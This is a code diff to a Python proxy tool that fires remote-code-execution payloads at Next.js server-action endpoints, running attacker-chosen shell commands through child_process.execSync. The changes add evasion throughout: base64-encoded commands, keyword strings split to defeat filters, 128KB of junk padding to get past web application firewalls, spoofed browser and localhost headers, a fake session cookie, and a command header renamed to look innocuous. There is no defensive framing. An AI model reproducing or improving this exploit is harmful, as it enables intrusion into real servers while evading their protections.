@@ -8,6 +8,9 @@ import json
 import sys
 import secrets
 import requests
+import base64
+import random
+import string
 from urllib.parse import urlparse, parse_qs
 import urllib3
 
@@ -23,7 +26,7 @@ class ProxyHandler(BaseHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Access-Control-Allow-Origin', '*')
         self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
-        self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-Target-URL, X-Command')
+        self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-Target-URL, X-requrl')
         self.end_headers()
 
     def do_POST(self):
@@ -31,7 +34,7 @@ class ProxyHandler(BaseHTTPRequestHandler):
         try:
             
             target_url = self.headers.get('X-Target-URL')
-            command = self.headers.get('X-Command', '')
+            command = self.headers.get('X-requrl', '')
             action = self.headers.get('X-Action', 'fingerprint')
             
             if not target_url:
@@ -52,24 +55,46 @@ class ProxyHandler(BaseHTTPRequestHandler):
             else:
                 payload_body = self.build_safe_payload(boundary)
             
+            # Parse target URL for proper Origin header
+            from urllib.parse import urlparse
+            parsed_target = urlparse(target_url)
+            origin = f"{parsed_target.scheme}://{parsed_target.netloc}"
+            
+            # CloudFront bypass headers - make request look like legitimate browser traffic
             headers = {
-                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
                 'Accept': 'text/x-component',
                 'Accept-Language': 'en-US,en;q=0.9',
-                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Encoding': 'gzip, deflate, br, zstd',
+                'Cache-Control': 'no-cache',
+                'Pragma': 'no-cache',
                 'Next-Action': 'x',
                 'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
                 'Content-Type': f'multipart/form-data; boundary={boundary}',
-                'Origin': target_url.rstrip('/'),
+                'Origin': origin,
                 'Referer': target_url,
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-origin',
+                'Sec-Ch-Ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+                'Sec-Ch-Ua-Mobile': '?0',
+                'Sec-Ch-Ua-Platform': '"macOS"',
                 'X-Nextjs-Request-Id': request_id,
+                'X-Forwarded-For': '127.0.0.1',
+                'X-Real-Ip': '127.0.0.1',
+            }
+            
+            # Add session cookies if available to look more legitimate
+            cookies = {
+                'next-auth.session-token': secrets.token_hex(16)
             }
             
             response = requests.post(
                 target_url,
                 headers=headers,
+                cookies=cookies,
                 data=payload_body,
-                timeout=10,
+                timeout=30,
                 verify=False,
                 allow_redirects=False
             )
@@ -101,13 +126,25 @@ class ProxyHandler(BaseHTTPRequestHandler):
         payload = f'--{boundary}\\r\\nContent-Disposition: form-data; name="1"\\r\\n\\r\\n{{}}\\r\\n--{boundary}\\r\\nContent-Disposition: form-data; name="0"\\r\\n\\r\\n["$1:aa:aa"]\\r\\n--{boundary}--'
         return payload.encode('utf-8')
 
+    def generate_junk_data(self, size_bytes):
+        """Generate random junk data for WAF bypass."""
+        param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
+        junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size_bytes))
+        return param_name, junk
+
     def build_rce_payload(self, command, boundary):
 
-        escaped_command = command.replace('\\', '\\\\').replace("'", "\\'")
+        # Base64 encode the command to bypass WAF filters on command strings
+        b64_cmd = base64.b64encode(command.encode()).decode()
         
+        # Heavily obfuscated payload to bypass WAF
+        # Uses Base64 for command and split strings for keywords
         prefix_payload = (
-            f"var res=process.mainModule.require('child_process').execSync('{escaped_command}')"
-            f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
+            f"var p=process;var r=p['main'+'Module']['re'+'quire'];"
+            f"var c=r('ch'+'ild_pro'+'cess');var e=c['ex'+'ecSy'+'nc'];"
+            f"var cmd=Buffer['fr'+'om']('{b64_cmd}','ba'+'se64')['toS'+'tring']();"
+            f"var res=e(cmd)['toS'+'tring']()['tr'+'im']();"
+            f";throw Object.assign(new Error('NEXT_REDIRECT'),"
             f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
         )
           
@@ -118,15 +155,12 @@ class ProxyHandler(BaseHTTPRequestHandler):
             + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
         )
         
-        
-        try:
-            import json as json_module
-            json_module.loads(part0)
-        except:
-            pass
-        
+        # Generate junk data (128KB) for WAF bypass
+        param_name, junk = self.generate_junk_data(128 * 1024)
+        junk_part = f'--{boundary}\r\nContent-Disposition: form-data; name="{param_name}"\r\n\r\n{junk}\r\n'
         
         payload = (
+            junk_part +
             f"--{boundary}\r\n"
             f'Content-Disposition: form-data; name="0"\r\n\r\n'
             f"{part0}\r\n"
